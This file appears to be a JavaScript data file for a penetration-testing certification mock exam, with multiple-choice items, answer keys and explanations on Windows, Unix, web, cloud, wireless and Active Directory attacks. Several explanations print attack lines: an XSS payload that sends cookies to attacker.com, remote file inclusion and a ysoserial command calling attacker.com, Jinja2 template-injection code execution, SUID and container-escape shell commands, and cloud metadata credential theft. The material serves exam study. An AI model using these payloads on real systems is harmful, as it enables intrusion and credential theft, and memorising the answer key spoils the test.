window.EXAM3 = {
  id: 3,
  title: "Mock Exam 3",
  subtitle: "Cloud, Wireless, Advanced Exploitation & Comprehensive Review",
  questions: [
    {id:"3-1",domain:"Windows",difficulty:"hard",q:"nmap identifies SMB on TCP 445. To enumerate SMB shares with a null session, which nmap script is used, and what does a share named 'C$' appearing indicate?",opts:["smb-enum-shares; C$ is an admin share providing C drive root access if authenticated","smb-ls; C$ indicates SMB running in legacy mode","smb-vuln-ms17-010; C$ indicates EternalBlue vulnerability","smb-brute; C$ is the default Kerberos auth share"],ans:0,exp:"smb-enum-shares enumerates available SMB shares including C$, ADMIN$, IPC$. C$ is the default administrative share for the C: drive — accessible only with local administrator credentials. With admin credentials: net use \\\\target\\c$ /user:administrator <password> gives full filesystem access."},
    {id:"3-2",domain:"Windows",difficulty:"medium",q:"'net view /domain' on a domain-joined machine returns computer names. Which underlying protocol is used?",opts:["LDAP against the domain controller's Active Directory","NetBIOS/SMB browser protocol to query the master browser for the domain's computer list","DNS reverse lookups against the domain's DNS server","RPC against the Netlogon service on the PDC"],ans:1,exp:"'net view /domain' uses the SMB browser protocol. The master browser for the domain maintains a browse list and responds to browser queries. In modern AD environments without NetBIOS, this may fail — LDAP or PowerShell AD cmdlets are more reliable alternatives."},
    {id:"3-3",domain:"Windows",difficulty:"hard",q:"Port 139 is open alongside port 445. What additional attack surface does port 139 provide?",opts:["Port 139 provides direct access to NTLM authentication bypassing SMB signing","Port 139 (NetBIOS Session Service) allows SMB over NetBIOS, enabling NBT-NS poisoning and older SMB dialect negotiation attacks","Port 139 is used for RPC Endpoint Mapper enabling service enumeration","Port 139 exposes the Windows Registry Remote Protocol"],ans:1,exp:"Port 139 = NetBIOS Session Service (NBSS): SMB over NetBIOS. Port 445 = Direct Host SMB. With port 139 open, NBT-NS poisoning via Responder becomes more effective, older SMB dialects (SMB 1.0/CIFS) may be negotiated enabling MS17-010 variants, and NBT-NS broadcast responses are possible."},
    {id:"3-4",domain:"Windows",difficulty:"hard",q:"wmic qfe list brief shows only 'XP-SP2' with no additional patches. What attack implication does this confirm?",opts:["System is fully patched at SP2 level; no known vulnerabilities remain","Only SP2 applied with no subsequent hotfixes; numerous known vulnerabilities including MS08-067 may be present and should be verified","wmic qfe doesn't accurately report patch status","XP SP2 introduced kernel ASLR making exploitation significantly harder"],ans:1,exp:"wmic qfe (Quick Fix Engineering) lists installed patches. Only XP SP2 with no hotfixes means no patches since SP2 — a very vulnerable system. MS08-067, MS09-001, and numerous other critical vulnerabilities are likely present. Verify with Nessus or nmap vuln scripts before exploitation."},
    {id:"3-5",domain:"Windows",difficulty:"medium",q:"RID cycling finds RID 501 resolves to 'Guest'. What does an enabled Guest account with no password typically enable?",opts:["Pass-the-hash attacks using the Guest account's null LM hash","Null session enumeration and anonymous access to shares configured with 'Everyone' permissions","Kerberos AS-REP roasting since Guest accounts don't require preauthentication","Golden ticket generation using the Guest account's SID history"],ans:1,exp:"An enabled Guest account with no password: null session enumeration becomes trivial (connect as Guest with no password), and any shares or resources configured with 'Everyone' or 'Guests' permissions are accessible without authentication. Always test the Guest account when it is enabled."},
    {id:"3-6",domain:"Windows",difficulty:"hard",q:"Network capture shows NTLMSSP_AUTH message with zeroed LM response field. What does this indicate?",opts:["Authentication failed and the server rejected the credentials","LM authentication has been disabled on this client; the host is using NTLM or NTLMv2 only","The host is using Kerberos and the NTLM packet is a fallback decoy","The client has no password set and is sending a zero-length hash"],ans:1,exp:"Zeroed LM response in NTLM AUTHENTICATE: the client explicitly sent all zeros for the LM response field, indicating LM authentication is disabled. The NT response is valid and used for authentication. This improves security since the LM portion cannot be independently cracked. Modern Windows defaults disable LM authentication."},
    {id:"3-7",domain:"Unix",difficulty:"medium",q:"Unix /etc/passwd entry: 'oracle:x:1000:1000:Oracle Account:/home/oracle:/bin/sh'. The 'x' in the password field indicates what?",opts:["The account has no password set (equivalent to a blank password)","The password hash is stored in /etc/shadow rather than /etc/passwd","The account is disabled and cannot be used for authentication","The account uses Kerberos authentication and local password file is not consulted"],ans:1,exp:"The 'x' in /etc/passwd password field is a placeholder indicating the actual password hash is stored in /etc/shadow (shadow password system). On older systems without shadow passwords, the hash would appear directly in /etc/passwd. An asterisk (*) or '!' indicates a locked/disabled account."},
    {id:"3-8",domain:"Unix",difficulty:"hard",q:"Cron job runs as root: '*/10 * * * * root /tmp/maintenance.sh'. The file /tmp/maintenance.sh does not exist. What exploitation technique applies?",opts:["Modify the cron daemon's source file to inject the desired command","Create /tmp/maintenance.sh with a payload (e.g., chmod 4755 /bin/bash); it will be executed as root on the next 10-minute boundary","Use /tmp as working directory to compile and run an exploit targeting the cron daemon","The non-existent file causes a cron error exploitable via format string in cron log"],ans:1,exp:"If the cron job references a non-existent file and /tmp is world-writable (which it always is), any user can create /tmp/maintenance.sh with malicious content. On the next 10-minute boundary, root executes it. Simple payload: #!/bin/bash\\nchmod 4755 /bin/bash — creates a SUID bash. Or add a reverse shell one-liner."},
    {id:"3-9",domain:"Unix",difficulty:"medium",q:"unshadow produces: 'ftpusr:thursday:1015:1015:FTP User:/home/ftpusr:/bin/false'. John recovers 'thursday'. What does '/bin/false' as the shell indicate?",opts:["The account is fully functional; /bin/false is used for legacy FTP configurations","The account cannot be used for interactive shell login; however, the password may be reused on other accounts or services","The account is a system account and its password cannot be cracked by John the Ripper","The account uses /bin/false as a security measure that also disables password authentication"],ans:1,exp:"/bin/false as shell: prevents interactive shell login (SSH connection immediately terminates). However: (1) The password 'thursday' may be reused on other accounts, (2) FTP authentication may still work with these credentials, (3) The user might have sudo access. Always check for password reuse across all discovered accounts."},
    {id:"3-10",domain:"Unix",difficulty:"hard",q:"/usr/bin/find has the SUID bit set and is owned by root. How is this exploited via GTFOBins?",opts:["find / -name '*.conf' -exec cat {} \\; to read root-owned config files","find . -exec /bin/sh -p \\; -quit to execute a root shell using find's -exec flag while preserving SUID privileges","find /etc -name passwd -exec cp {} /tmp \\; to copy /etc/passwd","find / -perm -4000 -exec ls -la {} \\; to enumerate other SUID binaries"],ans:1,exp:"SUID find GTFOBin: 'find . -exec /bin/sh -p \\; -quit'. The -exec flag runs the specified command. /bin/sh -p (privileged mode) preserves the effective UID (root, due to SUID). The -quit stops find after the first match. Result: root shell. GTFOBins.github.io documents this and hundreds of similar techniques."},
    {id:"3-11",domain:"Unix",difficulty:"hard",q:"Solaris system uses DES password hashes (13 character hashes). What is the maximum effective password length and the implication?",opts:["Maximum 14 characters; passwords beyond 14 are silently truncated during authentication","Maximum 8 characters; any characters beyond 8 are silently ignored during hashing — 'password123' and 'password' hash identically","Maximum 10 characters; DES extends the standard algorithm to support 10-character passwords on Solaris","Maximum 8 characters; DES requires uppercase conversion of all characters before hashing"],ans:1,exp:"DES password hashing on Unix: the DES algorithm only uses the first 8 characters of the password. Characters 9+ are silently discarded. This means 'password123' and 'password' produce the SAME hash and either works for authentication. Maximum effective keyspace: 8 characters from the full ASCII character set."},
    {id:"3-12",domain:"Unix",difficulty:"hard",q:"TFTP brute force discovers a Cisco router configuration file containing 'enable secret 5 $1$mERr$EZzEFGThd...'. What does '5' indicate?",opts:["Type 5 is MD5-based password hashing; hashcat or John the Ripper with Cisco MD5 format can crack it offline","Type 5 is a proprietary Cisco encoding that cannot be cracked; only type 7 is reversible","Type 5 uses SHA-256 and is considered uncrackable with current hardware","Type 5 indicates the password is stored in plaintext with a rotation cipher"],ans:0,exp:"Cisco password types: Type 5 = MD5-based ($1$ confirms MD5 Unix crypt). Hashcat can crack it (mode 500: md5crypt) or John the Ripper (--format=md5crypt). Type 7 is trivially reversible (Vigenere cipher with known key). Type 8 uses PBKDF2-SHA256. Type 9 uses scrypt. Always crack Type 5 first — it's the most common enable secret type."},
    {id:"3-13",domain:"Unix",difficulty:"hard",q:"SUID binary: '/usr/sbin/python3.8' owned by root. Tester runs: 'python3.8 -c \"import os; os.setuid(0); os.system(\\\"/bin/bash -p\\\")\"'. Why does this achieve a root shell?",opts:["Python's setuid(0) call only works when running as www-data in the web context","The SUID bit on python3.8 sets effective UID to root; calling os.setuid(0) sets the real UID to root, and the shell spawned inherits this","The -c flag in Python disables security checks allowing arbitrary system calls","Python3.8 has a built-in root escalation module enabled by the SUID bit"],ans:1,exp:"SUID python3.8: the SUID bit causes python3.8 to run with the file owner's (root's) effective UID. os.setuid(0) then sets the real UID to root too (allowed since effective UID is 0). /bin/bash -p (privileged mode) preserves the effective UID and avoids dropping privileges. Result: root shell."},
    {id:"3-14",domain:"Web",difficulty:"hard",q:"Apache has 'AllowOverride All' configured. Tester has write access to a web directory. What does this enable via .htaccess that achieves code execution?",opts:["AllowOverride All enables Options ExecCGI in .htaccess, allowing a tester to enable PHP parsing of all files or CGI execution of uploaded scripts","AllowOverride All disables mod_security allowing WAF bypass attacks","AllowOverride All grants write access to the httpd.conf file enabling global server reconfiguration","AllowOverride All enables server-side includes which can include /etc/shadow in HTTP responses"],ans:0,exp:"AllowOverride All permits .htaccess to use any directive. Exploit: create .htaccess with 'AddType application/x-httpd-php .jpg' then upload a PHP webshell as 'shell.jpg' — it executes as PHP. Alternatively: 'Options +ExecCGI' + 'AddHandler cgi-script .py' enables CGI execution of uploaded Python scripts. This is why AllowOverride should be restricted in production."},
    {id:"3-15",domain:"Web",difficulty:"medium",q:"HTTP responses show 'X-Powered-By: PHP/5.6.4' and 'Server: Apache/2.2.22 (Debian)'. What is the security recommendation?",opts:["The server is vulnerable to Shellshock since Apache 2.2 is affected","These headers constitute information disclosure of technology stack; the recommendation is to remove or obfuscate them to prevent targeted version-specific attacks","PHP 5.6.4 is known to be vulnerable to SQL injection; patch immediately","Apache 2.2.22 has a known XSS vulnerability in error pages which these headers expose"],ans:1,exp:"Version disclosure in HTTP response headers reveals technology stack and version details enabling targeted attacks against known CVEs for those specific versions. Recommendation: suppress these headers (ServerTokens Prod, ServerSignature Off in Apache; expose_php=Off in PHP) to reduce attack surface."},
    {id:"3-16",domain:"Database",difficulty:"medium",q:"MySQL injection login form. Payload: ' UNION SELECT user(),2,3-- . What does user() return in MySQL?",opts:["The username of the currently logged-in web application user","The MySQL account running the query (e.g., 'webapp@localhost'), not the OS user","The name of the current database","The primary key of the current session record"],ans:1,exp:"MySQL user() function returns the MySQL user account executing the query, in format 'username@hostname' (e.g., 'webapp@localhost'). This is the DATABASE user, not the OS user. Knowing the MySQL user tells you if the account has FILE privileges (for LOAD DATA INFILE / SELECT INTO OUTFILE attacks)."},
    {id:"3-17",domain:"Web",difficulty:"medium",q:"Stored XSS payload injected into a comment field: '<img src=x onerror=document.location=\"http://attacker.com/?\"+document.cookie>'. What is the purpose of this payload?",opts:["It tests for CSRF by loading an image from the attacker's server","It exfiltrates the victim's session cookies to the attacker's server by redirecting the browser when the image fails to load","It performs DOM-based XSS by modifying the src attribute of existing images","It tests for Content Security Policy implementation by attempting to load a cross-origin image"],ans:1,exp:"This stored XSS payload: creates an <img> tag with a non-existent src (x). When the browser fails to load the image, the onerror handler fires. document.location redirects the browser to the attacker's server with the document.cookie value appended to the URL. The attacker sees the victim's session cookie in their server logs."},
    {id:"3-18",domain:"Web",difficulty:"hard",q:"PHP: '$file = $_GET[\"page\"] . \".php\"; include($file);'. RFI vulnerability confirmed. PHP older than version 5.3.4. How does null byte injection help?",opts:["LFI vulnerability; null byte truncates the .php extension in PHP <5.3.4","RFI vulnerability; null byte allows bypassing the .php extension append in PHP <5.3.4, enabling inclusion of files like shell.txt without .php extension on the remote server","Path traversal; null bytes cause the file system to stop reading the path at the null byte","Type juggling; the null byte converts the string to boolean false in the include call"],ans:1,exp:"RFI with null byte bypass (PHP < 5.3.4): submitting 'http://attacker.com/shell.txt%00' causes PHP to truncate the string at the null byte (%00) BEFORE appending '.php'. So the actual include becomes: include('http://attacker.com/shell.txt') instead of include('http://attacker.com/shell.txt.php'). Allows including files with any extension."},
    {id:"3-19",domain:"Web",difficulty:"hard",q:"REST API uses JWT with HS256. JWT secret is 'secret'. What can the tester now do with the known secret?",opts:["Decrypt the JWT payload since HS256 encrypts the token contents","Forge valid JWT tokens with any claims (e.g., admin:true) by signing them with the compromised secret","Perform timing attack to enumerate other valid JWT secrets","Replay captured JWT tokens without modification"],ans:1,exp:"HS256 (HMAC-SHA256) is symmetric — the same key signs and verifies. JWT payload is NOT encrypted, only signed (Base64URL encoded). With the known secret: decode the payload (base64url), modify claims (add admin:true, change user_id), re-encode, sign with the secret using HS256, submit the forged JWT. The server verifies the HMAC correctly and accepts it."},
    {id:"3-20",domain:"Web",difficulty:"hard",q:"Flask/Jinja2 SSTI confirmed: '{{7*7}}' returns 49. What payload achieves RCE?",opts:["{{system('id')}}","{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}","{{exec('import os; os.system(\"id\")')}}","{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"],ans:3,exp:"Jinja2 SSTI RCE payload traverses Python's object model: request.application.__globals__ accesses Flask's global namespace, __builtins__ accesses Python builtins, __import__('os') imports the os module, .popen('id').read() executes the command. Alternative: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. The exact payload varies by Jinja2 version."},
    {id:"3-21",domain:"Web",difficulty:"hard",q:"Magic bytes 'AC ED 00 05' in an HTTP request body. Application uses vulnerable Apache Commons Collections. What tool generates a deserialization payload?",opts:["sqlmap with --tamper java-deserialize","ysoserial with the CommonsCollections1 gadget chain to generate a command execution payload","Burp Suite's Java serialization scanner extension directly","Metasploit's java_deserialize module"],ans:1,exp:"AC ED 00 05 = Java serialized object header. ysoserial (by frohoff) generates serialized Java payloads using known 'gadget chains' from vulnerable libraries. CommonsCollections1 (for Commons Collections 3.1) produces a payload that executes OS commands when deserialized. Command: java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/x' > payload.ser."},
    {id:"3-22",domain:"Post-Exploitation",difficulty:"hard",q:"hashcat is run with '-a 6 wordlist.txt ?d?d?d?d'. What attack mode does '-a 6' represent?",opts:["Mode 6 is a rule-based attack applying rules from wordlist.txt to all digit combinations","Mode 6 is a hybrid attack: wordlist words with a mask appended; attempts each word in wordlist.txt with 4 decimal digits (0000-9999) appended","Mode 6 is a combination attack combining words from two wordlists","Mode 6 is an association attack using heuristics to generate passwords from usernames"],ans:1,exp:"hashcat attack modes: 0=straight dictionary, 1=combination, 3=brute force/mask, 6=hybrid wordlist+mask (word+mask appended), 7=hybrid mask+wordlist (mask+word prepended). Mode 6 with ?d?d?d?d appends all 4-digit combinations (0000-9999) to each word in the wordlist — catches 'password1234', 'Summer2023', etc."},
    {id:"3-23",domain:"Networking",difficulty:"hard",q:"A tester plugs a device running Responder into a public network port. After 15 minutes, NTLMv2 hashes are captured from multiple hosts without any user interaction. What protocol caused these automatic authentications?",opts:["ARP broadcasts picked up and converted to authentication requests","NBT-NS (NetBIOS Name Service) and LLMNR (Link-Local Multicast Name Resolution) broadcasts: Windows hosts send these broadcasts when DNS resolution fails; Responder answers these broadcasts claiming to be the requested host","DHCP requests that included Windows authentication credentials","802.1X network authentication that broadcasted credentials before the port was authenticated"],ans:1,exp:"NBT-NS and LLMNR: Windows hosts broadcast these protocols when DNS resolution fails for a hostname. Responder listens for these broadcasts, responds claiming to be the requested host, and captures the NTLM challenge-response when the Windows client attempts to authenticate. No user interaction required — this happens automatically in the background."},
    {id:"3-24",domain:"Post-Exploitation",difficulty:"medium",q:"Compromised Linux host: 'id' returns 'uid=33(www-data)'. /usr/sbin/python3.8 has SUID root. What command achieves a root shell?",opts:["python3.8 -c 'import subprocess; subprocess.run([\"su\",\"-\",\"root\"])'","python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/bash -p\")'","python3.8 --privileged -c 'exec(\"import os; os.system(root)\")'","sudo python3.8 -c 'import os; os.system(\"/bin/bash\")'"],ans:1,exp:"SUID python3.8 GTFOBin: os.setuid(0) is possible because the process's effective UID is already 0 (due to SUID). This sets the real UID to 0. Then os.system('/bin/bash -p') spawns bash in privileged mode (-p preserves effective UID). Result: root shell. Confirmed in GTFOBins for python and python3."},
    {id:"3-25",domain:"Windows",difficulty:"hard",q:"CREST CRT exam Windows Breakout scenario: locked desktop with only a Notepad shortcut accessible. Best technique to access system resources?",opts:["Use the Notepad 'Format' menu to inject shellcode into the font rendering engine","Use the Notepad 'File > Open' dialog as a file browser, navigate to and execute binaries via context menu or by typing a path in the address bar","Exploiting a buffer overflow in Notepad's text rendering to spawn a SYSTEM shell","Using Notepad's 'Edit > Paste' to insert a PowerShell command that executes from memory"],ans:1,exp:"Notepad escape technique: File > Open dialog is a Windows shell dialog that functions as a file browser. In the address bar, type a UNC path (\\\\server\\share) or a local path (C:\\Windows\\System32\\cmd.exe) and press Enter to browse to or execute files. Classic restricted desktop breakout requiring no exploitation — just Windows UI navigation tricks."},
    {id:"3-26",domain:"Windows",difficulty:"medium",q:"In the CREST CPSA practical 'Breakout 1', you've created and executed a .bat file containing 'ftp.exe'. Which command reads a registry key value from within the FTP shell?",opts:["!regedit /e output.txt HKEY_CLASSES_ROOT\\exefile\\shell\\open\\command","!reg query HKCR\\exefile\\shell\\open\\command","!reg export HKCR\\exefile C:\\output.reg","!regedit.exe /s HKCR\\exefile\\shell"],ans:1,exp:"From within the Windows FTP shell, prefix OS commands with ! to execute them. 'reg query' displays registry key values directly in the console. The specific key HKCR\\exefile\\shell\\open\\command shows the command used to execute .exe files — a relevant registry query in the breakout scenario. Documented: '!reg query HKEY_CLASSES_ROOT\\exefile\\shell\\open\\command'."},
    {id:"3-27",domain:"Unix",difficulty:"hard",q:"In the CREST CPSA Unix 1 practical, after XDMCP login and finding Apache under sudo, 'httpd -f /etc/shadow -t' is run. Why does this produce shadow file content?",opts:["httpd with the -t flag enables test mode which dumps configuration file contents","httpd parses the specified file as an Apache configuration; when /etc/shadow is parsed as a config file, syntax errors cause httpd to output lines of the file in error messages, revealing hash contents","/etc/shadow is a valid Apache configuration file on some Unix systems","The -f flag enables file tracing which logs all accessed files including /etc/shadow contents"],ans:1,exp:"Apache -t (test/syntax check) + -f (specify config file): when /etc/shadow is passed as the Apache config file, Apache's config parser attempts to interpret each line as a directive. When it encounters invalid syntax (password hash entries), it outputs error messages including the offending line — thus disclosing the shadow file's content."},
    {id:"3-28",domain:"Cloud",difficulty:"hard",q:"During an AWS assessment, an S3 bucket is configured with 'ListBucket' permission for 'AuthenticatedUsers' (all AWS accounts). What can any AWS account holder do?",opts:["Only the bucket owner can list and access objects","Any authenticated AWS account can enumerate all objects in the bucket — potentially exposing sensitive filenames even if the objects themselves are not publicly readable","Any AWS account can read and write to the bucket since ListBucket implies full access","AuthenticatedUsers only refers to users in the same AWS organisation"],ans:1,exp:"AWS S3 'AuthenticatedUsers' refers to ANY authenticated AWS account globally (not just users in your organisation). A 'ListBucket' permission for AuthenticatedUsers means any AWS account can enumerate all object keys in the bucket. Even if object contents are not publicly readable, knowing key names can reveal sensitive data structure, filenames (e.g., 'payroll_Q4_2023.xlsx'), and business context."},
    {id:"3-29",domain:"Cloud",difficulty:"hard",q:"Azure web application uses a Managed Identity. The tester finds SSRF in the application. Which endpoint reveals the Managed Identity credentials?",opts:["http://169.254.169.254/latest/meta-data/","http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/","http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token","http://169.254.169.254/openstack/2012-08-10/meta_data.json"],ans:1,exp:"Azure Instance Metadata Service (IMDS) endpoint for Managed Identity token: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=<scope>. This returns an OAuth2 access token for the Azure resource specified. The Metadata:true header is required in Azure IMDS requests. AWS uses /latest/meta-data/. GCP uses metadata.google.internal."},
    {id:"3-30",domain:"Cloud",difficulty:"hard",q:"GCP assessment: a compute instance has the 'cloud-platform' OAuth scope. What does this mean for the instance's capabilities?",opts:["The instance can only access Google Cloud Storage","The 'cloud-platform' scope grants full access to all Google Cloud APIs — the instance can interact with any GCP service the service account has permissions for","The scope is read-only and only allows listing resources","The scope only applies to the GCP Console and not programmatic API access"],ans:1,exp:"GCP 'cloud-platform' OAuth scope: this is the broadest possible scope, granting access to ALL Google Cloud APIs. Combined with a service account that has broad IAM permissions (even 'Editor' role), this gives the compute instance the ability to interact with Cloud Storage, BigQuery, Cloud SQL, Secret Manager, etc."},
    {id:"3-31",domain:"Cloud",difficulty:"hard",q:"AWS Lambda execution role has 'iam:CreateUser' and 'iam:AttachUserPolicy' permissions. If an attacker can execute code within the Lambda, what attack does this enable?",opts:["Lambda can only create users within its own function namespace","The Lambda execution role can create new IAM users and attach admin policies — enabling a persistent backdoor IAM user with admin access to the entire AWS account","Lambda IAM permissions are isolated to the function and cannot affect other AWS services","Creating IAM users requires console access; API-based creation is not possible"],ans:1,exp:"Privilege escalation via IAM permissions: 'iam:CreateUser' allows creating new IAM users, 'iam:AttachUserPolicy' allows attaching policies (including AdministratorAccess). If an attacker can execute code in the Lambda (RCE, injection, event poisoning), they can: CreateUser (backdoor_user), CreateAccessKey (backdoor_user), AttachUserPolicy (backdoor_user, AdministratorAccess). Result: persistent admin access to the entire AWS account."},
    {id:"3-32",domain:"Cloud",difficulty:"hard",q:"Docker container found running with '--privileged' flag. What are the security implications?",opts:["Privileged containers cannot access the host filesystem; they only have elevated capabilities within the container namespace","Privileged containers have all Linux capabilities enabled and can access host devices; using /dev/sda1 or similar, an attacker can mount the host filesystem and escape the container","Privileged containers can only escalate within the same Kubernetes namespace","The --privileged flag grants additional CPU scheduling priority but has no security impact"],ans:1,exp:"Docker --privileged: disables all container security boundaries. The container gets ALL Linux capabilities (CAP_SYS_ADMIN, etc.), access to all host devices (/dev/), and can make changes to the host kernel. Escape technique: mount the host filesystem via 'mount /dev/sda1 /mnt', then chroot into it. Always avoid --privileged in production."},
    {id:"3-33",domain:"Cloud",difficulty:"hard",q:"EC2 instance with IMDSv1 enabled and SSRF in hosted application. What is accessible via http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>?",opts:["IAM role's ARN and attached policy documents","Temporary AWS credentials (AccessKeyId, SecretAccessKey, Token) valid for the role assumption duration, allowing AWS API calls with EC2 instance's IAM permissions","The EC2 instance's SSH private key for the configured key pair","AWS account ID and IAM role trust policy"],ans:1,exp:"AWS IMDSv1 metadata endpoint returns temporary STS credentials for the EC2 instance role: AccessKeyId, SecretAccessKey, Token, Expiration. These are temporary but rotated automatically. With these credentials you can make AWS API calls with the instance's IAM permissions: if the role has AdministratorAccess, full AWS account takeover is possible."},
    {id:"3-34",domain:"Cloud",difficulty:"hard",q:"Kubernetes cluster with exposed API server (port 6443). Default service account token mounted in a pod. 'kubectl auth can-i --list' reveals what?",opts:["The cluster's entire RBAC policy","The permissions of the current service account's role binding within the namespace, revealing what API operations the pod's service account can perform","All other service accounts in the cluster","The Kubernetes version and applicable CVEs"],ans:1,exp:"kubectl auth can-i --list uses the mounted service account token to query the Kubernetes API server about the current account's permissions. It lists every resource/verb combination the service account is authorised for. If the default service account has excessive permissions (cluster-admin, create pods, etc.), this enables privilege escalation within the cluster."},
    {id:"3-35",domain:"Cloud",difficulty:"hard",q:"Container compromised. Docker socket (/var/run/docker.sock) is mounted inside. What is the impact?",opts:["Can communicate with other containers on the same bridge network","Docker socket = full control of Docker daemon; can create privileged container with host filesystem mounted, achieving complete host compromise and container escape","Docker socket only allows read access to container logs","Docker socket enables communication with Kubernetes orchestrator only"],ans:1,exp:"The Docker socket is the control plane for Docker daemon. With /var/run/docker.sock access from inside a container: docker run -v /:/host --privileged -it ubuntu chroot /host — mounts the host filesystem and escapes the container. Any operation available to the Docker daemon is available: create privileged containers, read host filesystem, load kernel modules."},
    {id:"3-36",domain:"Wireless",difficulty:"hard",q:"WPA2-Enterprise (802.1X) network is found. Which attack can capture credentials without knowing the network PSK?",opts:["Capture and crack the 4-way handshake as with WPA2-PSK","Evil twin attack with a rogue RADIUS server: clients connecting to the rogue AP attempt EAP authentication, the rogue server captures EAP credentials (MSCHAPv2 challenges/responses) for offline cracking","Deauthenticate clients and capture the re-association with a modified RADIUS token","WPA2-Enterprise uses Kerberos tickets which can be captured and cracked"],ans:1,exp:"WPA2-Enterprise (802.1X) Evil Twin: set up a rogue AP with the same SSID, configure a rogue RADIUS server (hostapd-wpe). When clients connect and attempt EAP-MSCHAPv2 authentication, the rogue server captures the MSCHAPv2 challenge-response. These can be cracked offline (asleap, hashcat mode 5500) to recover domain credentials."},
    {id:"3-37",domain:"Wireless",difficulty:"hard",q:"WPA2-PSK 4-way handshake captured. What information enables offline cracking?",opts:["Handshake contains PSK encrypted with AES; decrypt using SSID as IV","Handshake contains PTK derived from PSK, SSID, and nonces; cracking involves computing trial PTKs from password candidates and comparing the resulting MIC against captured handshake MIC","Handshake contains PMKID which is MD5 hash of PSK crackable by rainbow tables","Handshake exposes PMK directly decryptable using SSID"],ans:1,exp:"WPA2-PSK 4-way handshake cracking: PMK = PBKDF2(passphrase, SSID, 4096 iterations, 256 bits). PTK = PRF(PMK, ANonce, SNonce, BSSID, client_MAC). MIC = HMAC-SHA1 of EAPOL frame using KCK (derived from PTK). Cracking: for each password candidate, compute PMK → PTK → KCK → MIC, compare MIC with captured MIC. Match = correct password. hashcat mode 22000."},
    {id:"3-38",domain:"Wireless",difficulty:"hard",q:"WiFi clients need to be forced to connect to a rogue AP. Which technique deauthenticates them from the legitimate AP?",opts:["Beacon flooding sending fake beacon frames from rogue AP","802.11 deauthentication frame injection: sending spoofed deauth frames (with legitimate AP's BSSID as source) to clients, forcing them to disconnect","ARP cache poisoning of the wireless network to redirect client DNS","Jamming the legitimate AP's frequency"],ans:1,exp:"802.11 deauthentication injection (without PMF): 802.11 management frames are unauthenticated. Sending a deauth frame spoofed from the legitimate AP's BSSID to clients causes them to disconnect. They then scan for available APs and connect to the strongest signal — your rogue AP. Use: aireplay-ng -0 or MDK3. PMF (802.11w) prevents this attack."},
    {id:"3-39",domain:"Wireless",difficulty:"hard",q:"802.11w (PMF) enabled network. Deauthentication frame injection attempted. Clients don't disconnect. Why?",opts:["Wireless card doesn't support 802.11n required for deauth injection","802.11w mandates cryptographic protection of management frames including deauth; spoofed deauth frames without proper MIC are discarded","Deauthentication attack requires Beacon frame flood first","WPA3 is required for PMF to function; WPA2 networks remain vulnerable"],ans:1,exp:"802.11w (Protected Management Frames / PMF): management frames (deauthentication, disassociation, action frames) are cryptographically protected with a Message Integrity Code (MIC). Spoofed deauth frames from an attacker (without the proper MIC derived from the PTK/IGTK) are discarded by both the AP and clients. Enabled in WPA2 (optional/required) and mandatory in WPA3."},
    {id:"3-40",domain:"Networking",difficulty:"hard",q:"ICS/SCADA system with Modbus on TCP 502. What specific risk does unauthenticated Modbus access present?",opts:["Modbus allows reading sensor data only; actuator control not possible without OPC UA","Modbus has no authentication; any device can read sensor values AND send control commands (write coils/registers) to PLCs, potentially causing physical process disruption","Modbus is read-only; write operations require a separate industrial control protocol","Modbus uses proprietary encryption preventing data interception but authentication is weak"],ans:1,exp:"Modbus is designed for simplicity — it has NO authentication, NO authorisation, NO encryption. Any connected device can: read discrete inputs (FC1/FC2), read registers (FC3/FC4), write coils/registers (FC5/FC6/FC15/FC16). In an industrial context, writing registers to a PLC can directly control physical processes: motors, valves, pumps. This can cause physical damage or safety incidents."},
    {id:"3-41",domain:"Networking",difficulty:"hard",q:"802.1Q VLAN hopping via double-tagging. What specific switch configuration makes this possible?",opts:["Switch uses 802.1Q trunking on all ports including access ports","Attacker's port is configured as an access port on the same VLAN as the switch's native VLAN (VLAN 1); the double-tagged frame bypasses VLAN isolation when outer tag matches native VLAN","VLAN hopping requires the attacker to be in the same broadcast domain as the target VLAN","Switch doesn't support 802.3ad link aggregation allowing VLAN ID manipulation"],ans:1,exp:"Double-tagging VLAN hopping: requires the attacker to be on the NATIVE VLAN (usually VLAN 1). Attacker sends a frame with two 802.1Q tags: outer tag = native VLAN ID (1), inner tag = target VLAN (e.g., VLAN 100). Switch 1 strips the outer tag (native VLAN, untagged), forwards to trunk. Switch 2 sees inner tag = VLAN 100 and delivers to target VLAN. Only works sender-to-victim (unidirectional)."},
    {id:"3-42",domain:"Networking",difficulty:"hard",q:"IPv6 enabled on hosts but network monitoring focuses only on IPv4. What attack becomes possible?",opts:["IPv6 allows direct communication bypassing IPv4-based firewall rules entirely","Rogue Router Advertisement attacks: attacker sends RA packets claiming to be an IPv6 router; hosts configure themselves with IPv6 default gateway via SLAAC, routing IPv6 traffic through the attacker unmonitored","IPv6 NDP is equivalent to ARP poisoning and blocked by the same controls","IPv6 extension headers allow fragmentation bypassing deep packet inspection on IPv4-based IDS"],ans:1,exp:"IPv6 Rogue RA attacks: send unsolicited RA packets claiming to be an IPv6 router. Hosts using SLAAC configure an IPv6 address and default gateway automatically. If no IPv6 monitoring exists, the attacker can MITM IPv6 traffic. Tools: fake_router6 (THC-IPV6). Mitigation: RA Guard, IPv6 monitoring, disable IPv6 where not used."},
    {id:"3-43",domain:"ActiveDirectory",difficulty:"hard",q:"During an AD assessment, you find a user account with 'ServicePrincipalName' set and the account password has not been changed in 2 years. What attack is most immediately applicable?",opts:["Pass-the-hash using the account's NT hash from LSASS memory","Kerberoasting: request a TGS ticket for the SPN, then crack the ticket offline to recover the account password","AS-REP roasting if the account has pre-authentication disabled","Golden ticket generation using the SPN as the service name"],ans:1,exp:"Kerberoasting: any domain user can request a TGS for the SPN. The ticket is encrypted with the account's NT hash. A 2-year-old password on a service account is likely weak or static — service account passwords are often set once and never changed. Use GetUserSPNs.py (impacket) or PowerView's Invoke-Kerberoast to extract the ticket, then hashcat mode 13100 to crack."},
